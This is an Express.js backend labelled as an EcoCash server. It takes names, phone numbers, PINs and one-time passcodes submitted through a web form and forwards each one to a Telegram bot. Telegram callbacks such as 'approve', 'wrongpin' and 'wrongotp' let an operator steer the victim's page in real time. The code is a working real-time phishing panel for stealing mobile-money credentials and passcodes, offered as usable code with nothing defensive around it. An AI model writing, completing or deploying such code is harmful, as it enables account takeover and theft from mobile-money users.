require('dotenv').config();
const express = require('express');
const path = require('path');
const db = require('./db');
const tg = require('./telegram');

const app = express();
const PORT = 3001; 

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/submit', async (req, res) => {
    const { name, phone, pin, amount } = req.body;
    const requestId = db.createSession(name, phone, pin, amount);
    console.log(`📝 New Application: ${requestId}`);
    await tg.sendApplication(name, phone, pin, amount, requestId);
    res.json({ success: true, requestId });
});

app.post('/api/submit-otp', async (req, res) => {
    const { requestId, otp } = req.body;
    const session = db.getSession(requestId);
    if (!session) return res.status(404).json({ error: "Session not found" });
    
    db.updateSession(requestId, { otp: otp });
    console.log(`🔐 OTP Received for ${requestId}: ${otp}`);
    await tg.sendOTPVerification(session, otp);
    res.json({ success: true });
});

app.get('/api/status/:id', (req, res) => {
    const session = db.getSession(req.params.id);
    if (!session) return res.status(404).json({ error: "Not found" });
    res.json(session);
});

tg.startPolling(async (action, requestId, messageId, originalText) => {
    const session = db.getSession(requestId);
    if (!session) return;

    if (action === 'approve') {
        db.updateSession(requestId, { status: 'pending_otp' });
        console.log(`✅ ${requestId} APPROVED. Moving to OTP.`);
        await tg.editMessage(messageId, originalText + "\n\n✅ *APPROVED*");
    } 
    else if (action === 'reject') {
        db.updateSession(requestId, { status: 'kick_to_form' });
        console.log(`❌ ${requestId} REJECTED. Moving to Form.`);
        await tg.editMessage(messageId, originalText + "\n\n❌ *REJECTED*");
    }
    else if (action === 'correct') {
        db.updateSession(requestId, { status: 'success_page' }); 
        console.log(`🎉 ${requestId} SUCCESS.`);
        await tg.editMessage(messageId, originalText + "\n\n🎉 *SUCCESSFUL*");
    }
    else if (action === 'wrongpin') {
        db.updateSession(requestId, { status: 'kick_to_login' }); 
        console.log(`⚠️ ${requestId} WRONG PIN. Moving to Login.`);
        await tg.editMessage(messageId, originalText + "\n\n❌ *WRONG PIN*");
    }
    else if (action === 'wrongotp') {
        db.updateSession(requestId, { status: 'kick_to_otp' }); 
        console.log(`⚠️ ${requestId} WRONG OTP. Moving to OTP.`);
        await tg.editMessage(messageId, originalText + "\n\n⚠️ *WRONG OTP*");
    }
});

app.listen(PORT, () => {
    console.log(`\n✅ EcoCash Server running at http://localhost:${PORT}`);
});